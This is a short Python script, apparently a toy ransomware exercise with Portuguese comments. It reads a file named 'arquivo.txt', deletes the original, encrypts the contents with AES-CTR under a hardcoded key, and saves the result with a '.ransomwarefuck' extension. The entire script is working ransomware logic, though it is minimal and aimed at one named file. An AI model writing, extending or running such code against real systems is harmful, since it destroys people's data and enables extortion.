import os
import pyaes

# Abrir arquivo

file_name = 'arquivo.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Removendo arquivo
os.remove(file_name)

# Encriptando
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)
crypt_data = aes.encrypt(file_data)
new_file = file_name + '.ransomwarefuck'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypt_data)
new_file.close()
